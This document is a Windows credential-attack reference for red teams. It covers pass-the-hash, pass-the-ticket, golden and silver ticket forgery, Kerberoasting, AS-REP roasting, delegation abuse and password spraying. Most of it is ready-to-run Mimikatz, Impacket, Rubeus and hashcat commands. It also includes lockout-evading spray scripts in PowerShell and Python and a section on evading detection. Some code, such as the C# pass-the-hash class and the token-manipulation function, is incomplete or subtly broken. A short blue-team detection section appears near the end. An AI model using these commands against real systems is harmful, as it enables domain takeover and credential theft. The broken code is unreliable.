# Windows Password Attack Techniques Reference

## ELI5: The Key Copying Shop

### The Master Key Maker Analogy

Imagine you're a locksmith who discovered something amazing: you don't need the actual key to open locks!

**Traditional Lockpicking:**
```
Find key → Copy key → Open door
(Get password → Type password → Login)
```

**Our Advanced Methods:**
```
Method 1 (Pass-the-Hash): Take a photo of the key → 3D print it → Opens door!
Method 2 (Pass-the-Ticket): Steal the visitor badge → Flash it → Security waves you through!
Method 3 (Kerberoasting): Record the door's beep code → Crack it offline → Unlimited access!
```

### Why Passwords Aren't Always Needed

**The Authentication Truth:**
```
What Windows checks: "Does this hash match?"
NOT: "What's the password?"

What Kerberos checks: "Is this ticket valid?"
NOT: "What's your password?"

What services check: "Does this token exist?"
NOT: "How did you get it?"
```

**This means:**
- **Hash = Password** (for authentication purposes)
- **Ticket = Identity** (for Kerberos)
- **Token = Access** (for services)

### The Attack Chain Visualization

```
Compromise one machine
        ↓
    Dump hashes
        ↓
Pass-the-Hash to another machine
        ↓
    Dump more hashes
        ↓
    Find domain admin hash
        ↓
    Pass-the-Hash to DC
        ↓
    💀 Domain Compromised 💀
```

## Pass-the-Hash (PtH) Deep Dive

### NTLM Authentication Breakdown

**How NTLM Really Works:**
```
1. Client: "I want to connect"
2. Server: "Here's a challenge: RANDOM123"
3. Client: Hash(NTLM_Hash + RANDOM123) = Response
4. Server: "Response matches! You're in!"

The Magic: If you have the NTLM hash, you can calculate the response!
```

### Mimikatz Implementation

```powershell
# Classic Mimikatz PtH
sekurlsa::logonpasswords  # Dump hashes first
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:32ED87BDB5FDC5E9CBA88547376818D4 /run:cmd.exe

# Advanced Mimikatz techniques
# Pass-the-Hash with specific NTLM
sekurlsa::pth /user:john /domain:CORP /ntlm:64F12CDDAA88057E06A81B54E73B949B /run:powershell.exe

# PtH with AES keys (if available)
sekurlsa::pth /user:admin /domain:CORP /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c4a3a3 /run:cmd

# PtH to spawn process as SYSTEM
sekurlsa::pth /user:Administrator /domain:. /ntlm:32ED87BDB5FDC5E9CBA88547376818D4 /run:"cmd.exe /c whoami"

# PtH with RID 500 (real Administrator)
sekurlsa::pth /user:Administrator /domain:WORKGROUP /ntlm:32ED87BDB5FDC5E9CBA88547376818D4 /rid:500
```

### Impacket Tools Suite

```python
#!/usr/bin/env python3
# Impacket PtH examples

# psexec.py - Service-based execution
from impacket.examples import psexec
psexec.py DOMAIN/username@10.10.10.10 -hashes :32ED87BDB5FDC5E9CBA88547376818D4

# wmiexec.py - WMI-based execution
from impacket.examples import wmiexec
wmiexec.py DOMAIN/username@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:32ED87BDB5FDC5E9CBA88547376818D4

# smbexec.py - SMB-based execution
smbexec.py DOMAIN/username@10.10.10.10 -hashes :32ED87BDB5FDC5E9CBA88547376818D4

# atexec.py - Task Scheduler execution
atexec.py DOMAIN/username@10.10.10.10 -hashes :32ED87BDB5FDC5E9CBA88547376818D4 whoami

# dcomexec.py - DCOM execution
dcomexec.py DOMAIN/username@10.10.10.10 -hashes :32ED87BDB5FDC5E9CBA88547376818D4
```

### Custom Pass-the-Hash Implementation

```csharp
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class CustomPTH
{
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LogonUser(
        string lpszUsername,
        string lpszDomain,
        IntPtr lpszPassword,
        int dwLogonType,
        int dwLogonProvider,
        out IntPtr phToken
    );

    [DllImport("ntdll.dll")]
    public static extern int NtAllocateLocallyUniqueId(out LUID luid);

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_EXTERNAL_TICKET
    {
        public IntPtr ServiceName;
        public IntPtr TargetName;
        public IntPtr ClientName;
        public IntPtr DomainName;
        public IntPtr TargetDomainName;
        public IntPtr AltTargetDomainName;
        public KERB_CRYPTO_KEY SessionKey;
        public uint TicketFlags;
        public uint Flags;
        public long KeyExpirationTime;
        public long StartTime;
        public long EndTime;
        public long RenewUntil;
        public long TimeSkew;
        public int EncodedTicketSize;
        public IntPtr EncodedTicket;
    }

    public static void PassTheHash(string username, string domain, string ntlmHash)
    {
        // Convert NTLM hash to byte array
        byte[] hashBytes = StringToByteArray(ntlmHash);

        // Create NTLM authentication package
        LSA_STRING authPackage = new LSA_STRING("NTLM");
        IntPtr authPackageHandle;
        LsaLookupAuthenticationPackage(lsaHandle, ref authPackage, out authPackageHandle);

        // Build MSV1_0 interactive logon structure
        MSV1_0_INTERACTIVE_LOGON logonInfo = new MSV1_0_INTERACTIVE_LOGON();
        logonInfo.MessageType = MSV1_0_LOGON_TYPE.Interactive;
        logonInfo.UserName = new UNICODE_STRING(username);
        logonInfo.Domain = new UNICODE_STRING(domain);
        logonInfo.NtHash = hashBytes;

        // Perform logon
        IntPtr profileBuffer;
        int profileBufferLength;
        IntPtr tokenHandle;
        QUOTA_LIMITS quotaLimits;
        LUID logonId;
        int subStatus;

        int result = LsaLogonUser(
            lsaHandle,
            ref originName,
            LOGON_TYPE.Interactive,
            authPackageHandle,
            ref logonInfo,
            Marshal.SizeOf(logonInfo),
            IntPtr.Zero,
            ref tokenSource,
            out profileBuffer,
            out profileBufferLength,
            out logonId,
            out tokenHandle,
            out quotaLimits,
            out subStatus
        );

        if (result == 0)
        {
            // Impersonate the token
            WindowsImpersonationContext context =
                WindowsIdentity.Impersonate(tokenHandle);

            // Now we're running as the target user
            Console.WriteLine($"Successfully impersonating {domain}\\{username}");
        }
    }
}
```

### Detection Evasion Techniques

```powershell
# Technique 1: Overpass-the-Hash (Use NTLM to get Kerberos ticket)
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:32ED87BDB5FDC5E9CBA88547376818D4 /run:powershell.exe
# In new PowerShell:
klist purge
klist  # Now have Kerberos tickets!

# Technique 2: Token manipulation instead of PtH
function Invoke-TokenPTH {
    param($Hash, $Username, $Domain)

    # Create sacrificial process
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = "cmd.exe"
    $startInfo.UseShellExecute = $false
    $process = [System.Diagnostics.Process]::Start($startInfo)

    # Inject hash into process token
    $token = [System.Security.Principal.WindowsIdentity]::GetCurrent().Token
    [Win32.Functions]::SetTokenInformation($token, 'TokenSessionId', $Hash)

    # Use token for authentication
    [System.Security.Principal.WindowsIdentity]::Impersonate($token)
}

# Technique 3: Use legitimate tools that support hash auth
# crackmapexec supports native hash authentication
crackmapexec smb 192.168.1.0/24 -u Administrator -H 32ED87BDB5FDC5E9CBA88547376818D4

# Technique 4: Reflection-based PtH (no disk touch)
$pth = [Reflection.Assembly]::Load([Convert]::FromBase64String($mimikatzBase64))
$pth.EntryPoint.Invoke($null, @(,@('/user:admin', '/ntlm:hash', '/run:cmd')))
```

## Pass-the-Ticket (PtT) Techniques

### Kerberos Authentication Flow

```
     Client                  KDC                    Service
        |                     |                        |
        |--Request TGT------->|                        |
        |<----TGT + Key-------|                        |
        |                     |                        |
        |--Request TGS------->|                        |
        |<----Service Ticket--|                        |
        |                     |                        |
        |--Present Ticket----------------------------->|
        |<-----------------Authenticated!---------------|

The Magic: If you steal any ticket, you can use it!
```

### Ticket Types and Extraction

```powershell
# List current tickets
klist

# Mimikatz ticket extraction
sekurlsa::tickets /export  # Export all tickets

# Export specific tickets
kerberos::list /export

# Dump TGT (Ticket Granting Ticket)
sekurlsa::krbtgt

# Extract tickets from memory
privilege::debug
sekurlsa::tickets

# Extract from specific LUID
sekurlsa::tickets /luid:0x3e7

# Save tickets to files
kerberos::list /export
dir *.kirbi  # Mimikatz format
```

### Ticket Injection Techniques

```powershell
# Mimikatz ticket injection
kerberos::ptt ticket.kirbi

# Rubeus ticket injection
Rubeus.exe ptt /ticket:doIFCjCCBQagAwIBBaEDAgEWoo...

# PowerShell ticket injection
[System.Reflection.Assembly]::LoadWithPartialName("System.IdentityModel") | Out-Null
$ticket = New-Object System.IdentityModel.Tokens.KerberosReceiverSecurityToken -ArgumentList $ticketBytes
$principal = New-Object System.Security.Principal.WindowsPrincipal($ticket)
[System.Threading.Thread]::CurrentPrincipal = $principal

# Linux impacket ticket usage
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass DOMAIN/administrator@dc01.domain.local

# Convert between ticket formats
# kirbi to ccache
python3 ticketConverter.py ticket.kirbi ticket.ccache

# ccache to kirbi
python3 ticketConverter.py ticket.ccache ticket.kirbi
```

### Golden Ticket Creation

```powershell
# Golden Ticket - Forge TGT with krbtgt hash
# Need: krbtgt hash, domain SID, username

# Get krbtgt hash
lsadump::dcsync /domain:corp.local /user:krbtgt

# Get domain SID
whoami /user
# Remove last segment (RID) from SID

# Create Golden Ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-123456789-1234567890 /krbtgt:32ED87BDB5FDC5E9CBA88547376818D4 /id:500 /ptt

# Advanced Golden Ticket with groups
kerberos::golden /user:newadmin /domain:corp.local /sid:S-1-5-21-1234567890-123456789-1234567890 /krbtgt:32ED87BDB5FDC5E9CBA88547376818D4 /id:1337 /groups:500,501,513,512,520,518,519 /ptt

# Golden Ticket with 10-year validity
kerberos::golden /user:persistence /domain:corp.local /sid:S-1-5-21-1234567890-123456789-1234567890 /krbtgt:32ED87BDB5FDC5E9CBA88547376818D4 /endin:3650 /renewmax:3650 /ptt
```

### Silver Ticket Creation

```powershell
# Silver Ticket - Forge TGS for specific service
# Need: service account hash, domain SID, target

# Get service account hash (e.g., computer account)
sekurlsa::logonpasswords

# Create Silver Ticket for CIFS (file share access)
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-123456789-1234567890 /target:fileserver.corp.local /service:cifs /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt

# Silver Ticket for multiple services
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-123456789-1234567890 /target:server.corp.local /service:cifs,http,host,rpcss,wsman /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt

# Silver Ticket for SQL Server
kerberos::golden /user:dba /domain:corp.local /sid:S-1-5-21-1234567890-123456789-1234567890 /target:sqlserver.corp.local /service:MSSQLSvc /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```

## Kerberoasting Mastery

### Understanding Service Principal Names

```powershell
# What are SPNs?
# Service Principal Names identify services in Kerberos
# Format: service/hostname:port/servicename

# Find SPNs in domain
setspn -T corp -Q */*

# PowerView SPN enumeration
Get-DomainUser -SPN | Select samaccountname, serviceprincipalname

# LDAP query for SPNs
([adsisearcher]"(&(objectClass=user)(servicePrincipalName=*))").FindAll() | ForEach {
    New-Object PSObject -Property @{
        samaccountname = $_.Properties.samaccountname
        serviceprincipalname = $_.Properties.serviceprincipalname
    }
}

# Find high-value SPNs (likely service accounts)
Get-DomainUser -SPN | Where {$_.samaccountname -notlike "*$"} | Select samaccountname, memberof, serviceprincipalname
```

### Requesting Service Tickets

```powershell
# Native Windows method
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.corp.local:1433"

# Request all SPNs
$spns = Get-DomainUser -SPN | Select -ExpandProperty serviceprincipalname
foreach($spn in $spns) {
    try {
        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
    } catch {}
}

# Export tickets for cracking
klist
# Or with Mimikatz
kerberos::list /export

# Rubeus Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt

# Targeted Kerberoasting
Rubeus.exe kerberoast /user:sqlservice /outfile:sqlhash.txt

# Kerberoast with specific encryption
Rubeus.exe kerberoast /rc4opsec /outfile:rc4hashes.txt
```

### Offline Password Cracking

```bash
# Hashcat for Kerberoasting
# Format: $krb5tgs$23$*SERVICE$DOMAIN$SPN*$HASH

# Crack with wordlist
hashcat -m 13100 kerberoast.txt rockyou.txt

# Crack with rules
hashcat -m 13100 kerberoast.txt wordlist.txt -r best64.rule

# Optimized cracking
hashcat -m 13100 kerberoast.txt wordlist.txt -O -w 3

# John the Ripper
john --format=krb5tgs --wordlist=rockyou.txt kerberoast.txt

# Custom rule for service accounts (often have patterns)
cat << 'EOF' > service_account.rule
$2019
$2020
$2021
$2022
$!
$@
$#
c$1
c$!
^Company
EOF

hashcat -m 13100 kerberoast.txt passwords.txt -r service_account.rule
```

### ASREPRoasting

```powershell
# Find accounts with "Do not require Kerberos preauthentication"
Get-DomainUser -PreauthNotRequired | Select samaccountname

# Request AS-REP hash
Rubeus.exe asreproast /user:vulnerable_user /format:hashcat /outfile:asrep.txt

# Or with impacket
python3 GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# Crack AS-REP hashes
hashcat -m 18200 asrep.txt rockyou.txt

# Set account to not require preauth (if you have permissions)
Set-DomainObject -Identity vulnerable_user -Set @{"useraccountcontrol"="4194304"}

# ASREPRoast all vulnerable accounts
Get-DomainUser -PreauthNotRequired | ForEach {
    Rubeus.exe asreproast /user:$_.samaccountname /format:hashcat
}
```

### Targeted Kerberoasting

```powershell
# Create honey SPN to catch attackers
setspn -s http/honeypot.corp.local:80 honeyuser

# Monitor for Kerberoasting attempts
$events = Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769} |
    Where {$_.Message -match "0x17"} |  # RC4 encryption
    Select TimeCreated, @{N='Account';E={$_.Properties[0].Value}},
           @{N='Service';E={$_.Properties[2].Value}},
           @{N='ClientIP';E={$_.Properties[9].Value}}

# Kerberoast high-value targets only
$targets = Get-DomainUser -SPN |
    Where {$_.memberof -match "Domain Admins|Enterprise Admins"} |
    Select -ExpandProperty serviceprincipalname

foreach($spn in $targets) {
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
}
```

## Credential Spraying Strategies

### Password Spraying Implementation

```powershell
# Smart password spraying to avoid lockouts
function Invoke-PasswordSpray {
    param(
        [string[]]$UserList,
        [string[]]$PasswordList,
        [string]$Domain,
        [int]$Delay = 30,
        [int]$Jitter = 10
    )

    # Get lockout policy
    $policy = Get-DomainPolicy | Select -ExpandProperty SystemAccess
    $lockoutThreshold = $policy.LockoutBadCount
    $observationWindow = $policy.ResetLockoutCount

    Write-Host "Lockout threshold: $lockoutThreshold attempts"
    Write-Host "Reset window: $observationWindow minutes"

    foreach($password in $PasswordList) {
        Write-Host "Spraying password: $password"

        foreach($user in $UserList) {
            # Check if account is locked
            $adUser = Get-ADUser $user -Properties LockedOut, badPwdCount
            if($adUser.LockedOut) {
                Write-Host "[-] $user is locked out, skipping"
                continue
            }

            if($adUser.badPwdCount -ge ($lockoutThreshold - 1)) {
                Write-Host "[-] $user has $($adUser.badPwdCount) bad attempts, skipping"
                continue
            }

            # Attempt authentication
            $cred = New-Object System.Management.Automation.PSCredential("$Domain\$user",
                (ConvertTo-SecureString $password -AsPlainText -Force))

            try {
                Start-Process cmd.exe -Credential $cred -WindowStyle Hidden
                Write-Host "[+] SUCCESS: $user : $password" -ForegroundColor Green
            } catch {
                Write-Host "[-] Failed: $user"
            }

            # Random delay to avoid pattern detection
            Start-Sleep -Seconds ($Delay + (Get-Random -Maximum $Jitter))
        }

        # Wait for observation window to reset
        Write-Host "Waiting $observationWindow minutes for reset window..."
        Start-Sleep -Seconds ($observationWindow * 60)
    }
}

# Common passwords for spraying
$passwords = @(
    "Password1",
    "Password123",
    "Company2021",
    "Company2022",
    "Company2023",
    "Spring2023",
    "Summer2023",
    "Fall2023",
    "Winter2023",
    "Welcome123"
)
```

### Multi-Protocol Spraying

```python
#!/usr/bin/env python3
import time
import random
from impacket.smbconnection import SMBConnection
import requests
from requests_ntlm import HttpNtlmAuth

class MultiProtocolSpray:
    """Spray passwords across multiple protocols"""

    def __init__(self, target, domain):
        self.target = target
        self.domain = domain
        self.delay = 30
        self.success = []

    def spray_smb(self, username, password):
        """Test SMB authentication"""
        try:
            smb = SMBConnection(self.target, self.target)
            smb.login(username, password, self.domain)
            smb.logoff()
            return True
        except:
            return False

    def spray_http(self, username, password):
        """Test HTTP NTLM authentication"""
        try:
            url = f"http://{self.target}"
            auth = HttpNtlmAuth(f"{self.domain}\\{username}", password)
            response = requests.get(url, auth=auth, timeout=5)
            return response.status_code != 401
        except:
            return False

    def spray_rdp(self, username, password):
        """Test RDP authentication"""
        import subprocess
        # Use xfreerdp to test
        cmd = f"xfreerdp /v:{self.target} /u:{username} /p:{password} /d:{self.domain} /cert-ignore +auth-only"
        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
        return "Authentication only, exit status 0" in result.stdout.decode()

    def spray_owa(self, username, password):
        """Test Outlook Web Access"""
        try:
            url = f"https://{self.target}/owa/auth.owa"
            data = {
                'username': f'{self.domain}\\{username}',
                'password': password,
                'flags': '0',
                'forcedownlevel': '0'
            }
            response = requests.post(url, data=data, verify=False)
            return 'reason=0' in response.url  # Successful auth redirects with reason=0
        except:
            return False

    def smart_spray(self, users, passwords):
        """Intelligent spraying with lockout avoidance"""

        protocols = [
            ('SMB', self.spray_smb),
            ('HTTP', self.spray_http),
            ('RDP', self.spray_rdp),
            ('OWA', self.spray_owa)
        ]

        for password in passwords:
            print(f"[*] Spraying: {password}")

            for user in users:
                # Rotate protocols to avoid detection
                protocol_name, protocol_func = random.choice(protocols)

                print(f"  Testing {user} via {protocol_name}...", end='')

                if protocol_func(user, password):
                    print(f" SUCCESS!")
                    self.success.append((user, password, protocol_name))
                else:
                    print(" Failed")

                # Random delay
                time.sleep(self.delay + random.randint(0, 10))

            # Long delay between passwords
            print(f"[*] Waiting 30 minutes before next password...")
            time.sleep(1800)

        return self.success
```

### Avoiding Lockouts

```powershell
# Check bad password count before spraying
function Get-SafeSprayTargets {
    param($Domain)

    $searcher = [adsisearcher]"(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $searcher.PropertiesToLoad.AddRange(@("samaccountname", "badPwdCount", "pwdLastSet", "lockoutTime"))

    $users = @()
    $searcher.FindAll() | ForEach {
        $user = $_.Properties

        # Skip if locked or too many bad attempts
        if($user.lockoutTime -eq 0 -and $user.badPwdCount -lt 3) {
            $users += $user.samaccountname
        }
    }

    return $users
}

# Monitor lockout events during spray
function Watch-LockoutEvents {
    $filter = @{
        LogName = 'Security'
        ID = 4740  # Account lockout event
    }

    while($true) {
        $events = Get-WinEvent -FilterHashtable $filter -ErrorAction SilentlyContinue |
            Where {$_.TimeCreated -gt (Get-Date).AddMinutes(-5)}

        if($events) {
            Write-Host "LOCKOUT DETECTED! Pausing spray!" -ForegroundColor Red
            $events | ForEach {
                Write-Host "Locked: $($_.Properties[0].Value)"
            }
            return $true
        }

        Start-Sleep -Seconds 10
    }
}
```

## Advanced Attack Techniques

### Pass-the-Hash to RDP

```powershell
# Enable Restricted Admin Mode (allows PtH to RDP)
# On target machine (requires admin):
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0 -PropertyType DWORD -Force

# Now can PtH to RDP
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:32ED87BDB5FDC5E9CBA88547376818D4 /run:"mstsc.exe /restrictedadmin"

# Or with xfreerdp on Linux
xfreerdp /v:10.10.10.10 /u:Administrator /d:CORP /pth:32ED87BDB5FDC5E9CBA88547376818D4
```

### Kerberos Delegation Abuse

```powershell
# Find delegation
Get-DomainComputer -TrustedToAuth | Select name, msds-allowedtodelegateto

# Unconstrained delegation abuse
# If compromised machine has unconstrained delegation:
# Wait for high-value target to connect
# Extract their TGT from memory
sekurlsa::tickets /export

# Use the TGT
kerberos::ptt admin-tgt.kirbi

# Constrained delegation abuse
# Use Rubeus to abuse constrained delegation
Rubeus.exe s4u /user:svc_account /rc4:E2B475C11DA2A0748290D87AA966C327 /impersonateuser:administrator /msdsspn:cifs/fileserver /ptt
```

### Resource-Based Constrained Delegation

```powershell
# If you have GenericWrite on a computer object
# Add yourself to msDS-AllowedToActOnBehalfOfOtherIdentity

# Create new computer account
import-module powermad
New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString 'Password123' -AsPlainText -Force)

# Get SID of new computer
$sid = (Get-DomainComputer FAKE01).objectsid

# Create security descriptor
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$bytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($bytes, 0)

# Set on target computer
Set-DomainObject -Identity TargetComputer -Set @{'msds-allowedtoactonbehalfofotheridentity'=$bytes}

# Now use Rubeus to get ticket
Rubeus.exe s4u /user:FAKE01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/targetcomputer /ptt
```

## Detection and OPSEC

### Blue Team Detection

```powershell
# Detect Pass-the-Hash
# Event ID 4624 with Logon Type 3 and NTLM
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} |
    Where {$_.Properties[8].Value -eq 3 -and $_.Properties[10].Value -eq 'NTLM'} |
    Select TimeCreated, @{N='User';E={$_.Properties[5].Value}},
           @{N='SourceIP';E={$_.Properties[18].Value}}

# Detect Kerberoasting
# Event ID 4769 with RC4 encryption (0x17)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} |
    Where {$_.Message -match '0x17'} |
    Select TimeCreated, @{N='Account';E={$_.Properties[0].Value}},
           @{N='Service';E={$_.Properties[2].Value}}

# Detect password spraying
# Multiple 4625 events from same source
$events = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} |
    Group-Object {$_.Properties[19].Value} |  # Group by source IP
    Where {$_.Count -gt 10}
```

### Red Team OPSEC

```powershell
# OPSEC-safe Kerberoasting
# Use AES instead of RC4
Rubeus.exe kerberoast /aes /outfile:hashes.txt

# Delay between requests
foreach($spn in $spns) {
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
    Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 120)
}

# Use legitimate processes for PtH
# Instead of cmd.exe, use:
sekurlsa::pth /user:admin /ntlm:hash /run:"C:\Windows\System32\svchost.exe"

# Clean up tickets after use
klist purge
```

## Conclusion

Windows password attacks demonstrate that traditional password security is fundamentally broken. You don't need passwords when you have:
- Hashes that work just as well
- Tickets that grant access
- Service accounts with weak passwords

Key takeaways:
1. **Hashes ARE passwords** in Windows authentication
2. **Kerberos tickets** are bearer tokens - possession = authentication
3. **Service accounts** are the weakest link
4. **Lockout policies** can be bypassed with patience
5. **Detection is hard** when using legitimate protocols

Remember: These techniques are powerful but leave traces. Always maintain OPSEC and only use in authorized testing.

## Quick Reference

```powershell
# Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:HASH /run:cmd

# Pass-the-Ticket
kerberos::ptt ticket.kirbi

# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt
hashcat -m 13100 hashes.txt rockyou.txt

# Golden Ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXX /krbtgt:HASH /ptt

# Password Spray
crackmapexec smb 10.10.10.0/24 -u users.txt -p Password1 --continue-on-success
```